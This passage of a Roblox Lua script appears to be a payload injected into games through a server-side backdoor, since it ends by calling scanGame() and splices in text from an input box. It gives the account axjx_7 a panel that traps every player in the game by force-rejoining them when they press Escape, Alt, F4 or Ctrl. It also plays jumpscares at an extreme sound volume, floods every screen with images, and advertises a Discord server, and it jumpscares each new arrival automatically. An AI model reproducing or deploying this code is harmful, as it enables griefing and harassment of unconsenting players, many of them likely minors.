                    TPServ:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
                end)
                
                -- 1秒后隐藏GUI
                delay(1, function()
                    if ucantleave then
                        ucantleave.Enabled = false
                    end
                end)
            end

            -- 设置传送GUI
            TPServ:SetTeleportGui(ucantleave)

            -- 监听菜单打开
            GuiServ.MenuOpened:Connect(function()
                RejoinLol()
            end)

            -- 监听窗口失去焦点
            UIS.WindowFocusReleased:Connect(function()
                RejoinLol()
            end)

            -- 检查菜单是否已经打开
            if GuiServ.MenuIsOpen then
                RejoinLol()
            end

            -- 监听按键输入
            UIS.InputBegan:Connect(function(input, gameProcessed)
                if gameProcessed then return end
                
                if input.UserInputType == Enum.UserInputType.Keyboard then
                    local blockedKeys = {
                        Enum.KeyCode.LeftAlt,
                        Enum.KeyCode.RightAlt,
                        Enum.KeyCode.LeftSuper,
                        Enum.KeyCode.RightSuper,
                        Enum.KeyCode.Delete,
                        Enum.KeyCode.Escape,
                        Enum.KeyCode.ButtonStart,
                        Enum.KeyCode.F4,
                        Enum.KeyCode.LeftControl,
                        Enum.KeyCode.RightControl
                    }
                    
                    for _, key in ipairs(blockedKeys) do
                        if input.KeyCode == key then
                            RejoinLol()
                            break
                        end
                    end
                end
            end)

            -- 监听玩家尝试离开
            player.OnTeleport:Connect(function(teleportState)
                if teleportState == Enum.TeleportState.Started then
                    RejoinLol()
                end
            end)

            -- 监听玩家断开连接
            player:GetPropertyChangedSignal("Parent"):Connect(function()
                if not player.Parent then
                    RejoinLol()
                end
            end)
        end

        print("反离开系统已为所有玩家激活（包括axjx_7）")
    end
},
        {
    name = "Jumpscare",
    func = function()
        for _, player in ipairs(game.Players:GetPlayers()) do
            -- 创建跳杀GUI
            local realmscare = Instance.new("ScreenGui")
            realmscare.Name = "realm-scare"
            realmscare.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            realmscare.ResetOnSpawn = false
            
            local ImageLabel = Instance.new("ImageLabel")
            ImageLabel.Parent = realmscare
            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ImageLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
            ImageLabel.Position = UDim2.new(0, 0, -0.0335968398, 0)
            ImageLabel.Size = UDim2.new(1, 0, 1.03359687, 0)
            ImageLabel.Image = "rbxassetid://75930818877094"
            
            local framefrrfr = Instance.new("Frame")
            framefrrfr.Name = "framefrrfr"
            framefrrfr.Parent = ImageLabel
            framefrrfr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            framefrrfr.BorderColor3 = Color3.fromRGB(27, 42, 53)
            framefrrfr.BorderSizePixel = 0
            framefrrfr.Position = UDim2.new(-0.000821621623, 0, 0.814750969, 0)
            framefrrfr.Size = UDim2.new(0.338442117, 0, 0.19506079, 0)
            
            -- 只为框架添加圆角
            local frameCorner = Instance.new("UICorner")
            frameCorner.CornerRadius = UDim.new(0, 8)
            frameCorner.Parent = framefrrfr
            
            local PercentageBar = Instance.new("ImageLabel")
            PercentageBar.Name = "PercentageBar"
            PercentageBar.Parent = framefrrfr
            PercentageBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            PercentageBar.BackgroundTransparency = 1.000
            PercentageBar.BorderColor3 = Color3.fromRGB(27, 42, 53)
            PercentageBar.Position = UDim2.new(0.0326975472, 0, 0.577336967, 0)
            PercentageBar.Size = UDim2.new(0.934, 0, 0.295081973, 0)
            PercentageBar.ScaleType = Enum.ScaleType.Slice
            PercentageBar.SliceCenter = Rect.new(100, 100, 100, 100)
            PercentageBar.SliceScale = 0.120
            
            local Label = Instance.new("TextLabel")
            Label.Name = "Label"
            Label.Parent = PercentageBar
            Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Label.BackgroundTransparency = 1.000
            Label.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Label.Size = UDim2.new(1, 0, 1, 0)
            Label.Font = Enum.Font.SourceSans
            Label.Text = "0%"
            Label.TextColor3 = Color3.fromRGB(255, 255, 255)
            Label.TextScaled = true
            Label.TextSize = 14.000
            Label.TextWrapped = true
            
            local Frame = Instance.new("ImageLabel")
            Frame.Name = "Frame"
            Frame.Parent = framefrrfr
            Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame.BackgroundTransparency = 1.000
            Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Frame.Position = UDim2.new(-0.204075292, 0, -0.198473275, 0)
            Frame.Size = UDim2.new(0.525885582, 0, 0.368852466, 0)
            Frame.Image = "rbxassetid://75930818877094"
            Frame.ImageColor3 = Color3.fromRGB(35, 35, 35)
            Frame.ScaleType = Enum.ScaleType.Slice
            Frame.SliceCenter = Rect.new(100, 100, 100, 100)
            Frame.SliceScale = 0.120
            
            local TextLabel = Instance.new("TextLabel")
            TextLabel.Parent = Frame
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel.Position = UDim2.new(0.383419693, 0, 0, 0)
            TextLabel.Size = UDim2.new(0.616580307, 0, 0.577777803, 0)
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "Loading..."
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14.000
            TextLabel.TextWrapped = true
            
            local TextLabel_2 = Instance.new("TextLabel")
            TextLabel_2.Parent = ImageLabel
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel_2.Position = UDim2.new(-0.00198846636, 0, 0.846784174, 0)
            TextLabel_2.Size = UDim2.new(0.339608967, 0, 0.0428137034, 0)
            TextLabel_2.Font = Enum.Font.SourceSans
            TextLabel_2.Text = "现在正在和Axjx69处对象中.."
            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.TextScaled = true
            TextLabel_2.TextSize = 14.000
            TextLabel_2.TextWrapped = true
            
            local TextLabel_3 = Instance.new("TextLabel")
            TextLabel_3.Parent = ImageLabel
            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.BackgroundTransparency = 1.000
            TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel_3.Position = UDim2.new(0.0562912859, 0, 0.899411678, 0)
            TextLabel_3.Size = UDim2.new(0.223557532, 0, 0.0245394632, 0)
            TextLabel_3.Font = Enum.Font.SourceSansItalic
            TextLabel_3.Text = "https://discord.gg/Uxtw7NZmKR"
            TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.TextScaled = true
            TextLabel_3.TextSize = 14.000
            TextLabel_3.TextWrapped = true
            
            -- 将GUI添加到玩家界面
            realmscare.Parent = player.PlayerGui
            
            -- 创建并播放声音
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://106777975376087"
            sound.Volume = 1000000000000000000000000
            sound.Parent = workspace
            sound:Play()
            
            wait(1)
            Label.Text = "100%"
            PercentageBar.Image = "rbxassetid://3570695787"
            PercentageBar.ImageColor3 = Color3.fromRGB(0, 145, 255)
            -- 5秒后销毁
            wait(5)
            realmscare:Destroy()
            wait(3)
            sound:Stop()
            sound:Destroy()
            
                -- 创建并播放声音
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://107706517765020"
                sound.Volume = 0.5
                sound.Parent = workspace
                sound:Play()
                
                wait(5)
                sound:Stop()
                sound:Destroy()
        end
    end
},
{
    name = "图片刷屏",
    func = function()
        -- 全局变量来跟踪刷屏状态和图片引用
        if not _G.ImageSpam then
            _G.ImageSpam = {
                Active = false,
                Screens = {},
                Connections = {}
            }
        end
        
        local imageSpam = _G.ImageSpam
        
        -- 如果刷屏正在进行，则停止并清除
        if imageSpam.Active then
            imageSpam.Active = false
            
            -- 断开所有连接
            for _, connection in ipairs(imageSpam.Connections) do
                connection:Disconnect()
            end
            imageSpam.Connections = {}
            
            -- 移除所有屏幕
            for _, screen in ipairs(imageSpam.Screens) do
                screen:Destroy()
            end
            imageSpam.Screens = {}
            
            print("图片刷屏已停止并清除")
            return
        end
        
        -- 开始刷屏
        imageSpam.Active = true
        
        -- 图片资源ID
        local imageId = "rbxassetid://75930818877094"
        
        -- 刷屏函数
        local function spawnRandomImage(player)
            if not imageSpam.Active then return end
            
            -- 创建ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "ImageSpamGui"
            screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            screenGui.ResetOnSpawn = false
            screenGui.Parent = player:WaitForChild("PlayerGui")
            
            -- 创建随机位置的图片
            local image = Instance.new("ImageLabel")
            image.Name = "SpamImage"
            image.Size = UDim2.new(0, math.random(100, 300), 0, math.random(100, 300))
            image.Position = UDim2.new(
                math.random(), 0,
                math.random(), 0
            )
            image.BackgroundTransparency = 1
            image.Image = imageId
            image.Parent = screenGui
            
            -- 随机旋转
            image.Rotation = math.random(-30, 30)
            
            -- 添加淡入动画
            image.ImageTransparency = 1
            local tween = game:GetService("TweenService"):Create(
                image,
                TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {ImageTransparency = 0}
            )
            tween:Play()
            
            -- 存储引用以便后续清除
            table.insert(imageSpam.Screens, screenGui)
            
            -- 设置随机消失时间
            delay(math.random(3, 8), function()
                if image and image.Parent then
                    local fadeTween = game:GetService("TweenService"):Create(
                        image,
                        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {ImageTransparency = 1}
                    )
                    fadeTween:Play()
                    
                    fadeTween.Completed:Connect(function()
                        if screenGui and screenGui.Parent then
                            screenGui:Destroy()
                        end
                    end)
                end
            end)
        end
        
        -- 为所有玩家启动刷屏
        for _, player in ipairs(game.Players:GetPlayers()) do
                -- 立即生成一些图片
                for i = 1, 5 do
                    spawnRandomImage(player)
                end
                
                -- 设置定时器持续生成图片
                local connection
                connection = game:GetService("RunService").Heartbeat:Connect(function()
                    if not imageSpam.Active then
                        connection:Disconnect()
                        return
                    end
                    
                    -- 控制生成频率（每秒2-4个）
                    if math.random(1, 30) <= 3 then -- 大约每秒2-4次
                        spawnRandomImage(player)
                    end
                end)
                
                table.insert(imageSpam.Connections, connection)
        end
        
        print("图片刷屏已启动")
    end
},
        {
            name = "重新加入",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "]===]..InputBox.Text[===[" then
                            local success, result = pcall(function()
                                return game:GetService("TeleportService"):TeleportToPlaceInstance(
                                    placeId,
                                    jobId,
                                    player
                                )
                            end)
                    end
                end
            end
        }
    }
    
    -- 创建功能按钮
    for i, buttonInfo in ipairs(buttonFunctions) do
        local buttonFrame = Instance.new("Frame")
        buttonFrame.Size = UDim2.new(1, -10, 0, 40)  -- 减小按钮高度
        buttonFrame.Position = UDim2.new(0, 5, 0, (i-1)*45)
        buttonFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        buttonFrame.BorderSizePixel = 0
        buttonFrame.Parent = scrollFrame
        
        -- 按钮圆角
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = buttonFrame
        
        -- 按钮名称
        local buttonName = Instance.new("TextLabel")
        buttonName.Size = UDim2.new(1, -10, 1, 0)
        buttonName.Position = UDim2.new(0, 10, 0, 0)
        buttonName.BackgroundTransparency = 1
        buttonName.Text = buttonInfo.name
        buttonName.TextColor3 = Color3.fromRGB(220, 220, 220)
        buttonName.TextXAlignment = Enum.TextXAlignment.Left
        buttonName.Font = Enum.Font.GothamSemibold
        buttonName.TextSize = 14  -- 减小字体大小
        buttonName.Parent = buttonFrame
        
        -- 按钮交互区域
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, 0, 1, 0)
        button.Position = UDim2.new(0, 0, 0, 0)
        button.BackgroundTransparency = 1
        button.BorderSizePixel = 0
        button.Text = ""
        button.Parent = buttonFrame
        
        -- 按钮悬停效果
        button.MouseEnter:Connect(function()
            buttonFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
        end)
        
        button.MouseLeave:Connect(function()
            buttonFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        end)
        
        -- 按钮点击事件
        button.MouseButton1Click:Connect(function()
            buttonInfo.func()
        end)
    end
    
    -- 最小化按钮事件
    local isMinimized = false
    minimizeBtn.MouseButton1Click:Connect(function()
        if isMinimized then
            -- 恢复显示
            contentFrame.Visible = true
            mainContainer.Size = UDim2.new(0, 350, 0, 300)
            minimizeBtn.Text = "-"
            isMinimized = false
        else
            -- 最小化
            contentFrame.Visible = false
            mainContainer.Size = UDim2.new(0, 350, 0, 40)
            minimizeBtn.Text = "+"
            isMinimized = true
        end
    end)
    
    -- 关闭按钮事件
    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        _G.AdminPanel.Created = false
        _G.AdminPanel.ScreenGui = nil
    end)
    
    print("已为玩家 axjx_7 创建现代化管理员控制面板")
end

-- 监听玩家加入事件，对所有玩家直接显示跳杀
game.Players.PlayerAdded:Connect(function(player)
    -- 等待玩家加载完成
    player:WaitForChild("PlayerGui")

    -- 稍微延迟一下，确保玩家完全加载
    delay(2, function()
        -- 创建跳杀GUI
            local realmscare = Instance.new("ScreenGui")
            realmscare.Name = "realm-scare"
            realmscare.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            realmscare.ResetOnSpawn = false
            
            local ImageLabel = Instance.new("ImageLabel")
            ImageLabel.Parent = realmscare
            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ImageLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
            ImageLabel.Position = UDim2.new(0, 0, -0.0335968398, 0)
            ImageLabel.Size = UDim2.new(1, 0, 1.03359687, 0)
            ImageLabel.Image = "rbxassetid://75930818877094"
            
            local framefrrfr = Instance.new("Frame")
            framefrrfr.Name = "framefrrfr"
            framefrrfr.Parent = ImageLabel
            framefrrfr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            framefrrfr.BorderColor3 = Color3.fromRGB(27, 42, 53)
            framefrrfr.BorderSizePixel = 0
            framefrrfr.Position = UDim2.new(-0.000821621623, 0, 0.814750969, 0)
            framefrrfr.Size = UDim2.new(0.338442117, 0, 0.19506079, 0)
            
            -- 只为框架添加圆角
            local frameCorner = Instance.new("UICorner")
            frameCorner.CornerRadius = UDim.new(0, 8)
            frameCorner.Parent = framefrrfr
            
            local PercentageBar = Instance.new("ImageLabel")
            PercentageBar.Name = "PercentageBar"
            PercentageBar.Parent = framefrrfr
            PercentageBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            PercentageBar.BackgroundTransparency = 1.000
            PercentageBar.BorderColor3 = Color3.fromRGB(27, 42, 53)
            PercentageBar.Position = UDim2.new(0.0326975472, 0, 0.577336967, 0)
            PercentageBar.Size = UDim2.new(0.934, 0, 0.295081973, 0)
            PercentageBar.ScaleType = Enum.ScaleType.Slice
            PercentageBar.SliceCenter = Rect.new(100, 100, 100, 100)
            PercentageBar.SliceScale = 0.120
            
            local Label = Instance.new("TextLabel")
            Label.Name = "Label"
            Label.Parent = PercentageBar
            Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Label.BackgroundTransparency = 1.000
            Label.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Label.Size = UDim2.new(1, 0, 1, 0)
            Label.Font = Enum.Font.SourceSans
            Label.Text = "0%"
            Label.TextColor3 = Color3.fromRGB(255, 255, 255)
            Label.TextScaled = true
            Label.TextSize = 14.000
            Label.TextWrapped = true
            
            local Frame = Instance.new("ImageLabel")
            Frame.Name = "Frame"
            Frame.Parent = framefrrfr
            Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame.BackgroundTransparency = 1.000
            Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Frame.Position = UDim2.new(-0.204075292, 0, -0.198473275, 0)
            Frame.Size = UDim2.new(0.525885582, 0, 0.368852466, 0)
            Frame.Image = "rbxassetid://75930818877094"
            Frame.ImageColor3 = Color3.fromRGB(35, 35, 35)
            Frame.ScaleType = Enum.ScaleType.Slice
            Frame.SliceCenter = Rect.new(100, 100, 100, 100)
            Frame.SliceScale = 0.120
            
            local TextLabel = Instance.new("TextLabel")
            TextLabel.Parent = Frame
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel.Position = UDim2.new(0.383419693, 0, 0, 0)
            TextLabel.Size = UDim2.new(0.616580307, 0, 0.577777803, 0)
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "Loading..."
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14.000
            TextLabel.TextWrapped = true
            
            local TextLabel_2 = Instance.new("TextLabel")
            TextLabel_2.Parent = ImageLabel
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel_2.Position = UDim2.new(-0.00198846636, 0, 0.846784174, 0)
            TextLabel_2.Size = UDim2.new(0.339608967, 0, 0.0428137034, 0)
            TextLabel_2.Font = Enum.Font.SourceSans
            TextLabel_2.Text = "现在正在和Axjx69处对象中.."
            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.TextScaled = true
            TextLabel_2.TextSize = 14.000
            TextLabel_2.TextWrapped = true
            
            local TextLabel_3 = Instance.new("TextLabel")
            TextLabel_3.Parent = ImageLabel
            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.BackgroundTransparency = 1.000
            TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextLabel_3.Position = UDim2.new(0.0562912859, 0, 0.899411678, 0)
            TextLabel_3.Size = UDim2.new(0.223557532, 0, 0.0245394632, 0)
            TextLabel_3.Font = Enum.Font.SourceSansItalic
            TextLabel_3.Text = "https://discord.gg/Uxtw7NZmKR"
            TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.TextScaled = true
            TextLabel_3.TextSize = 14.000
            TextLabel_3.TextWrapped = true
            
            -- 将GUI添加到玩家界面
            realmscare.Parent = player.PlayerGui
            
            -- 创建并播放声音
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://106777975376087"
            sound.Volume = 1000000000000000000000000
            sound.Parent = workspace
            sound:Play()
            
            wait(1)
            Label.Text = "100%"
            PercentageBar.Image = "rbxassetid://3570695787"
            PercentageBar.ImageColor3 = Color3.fromRGB(0, 145, 255)
            -- 5秒后销毁
            wait(5)
            realmscare:Destroy()
            wait(3)
            sound:Stop()
            sound:Destroy()
            
                -- 创建并播放声音
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://107706517765020"
                sound.Volume = 0.5
                sound.Parent = workspace
                sound:Play()
                
                wait(5)
                sound:Stop()
                sound:Destroy()
    end)
end)

-- 执行函数
createAdminGUIForAxjx7()]===] end)

CloseButton.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

scanGame()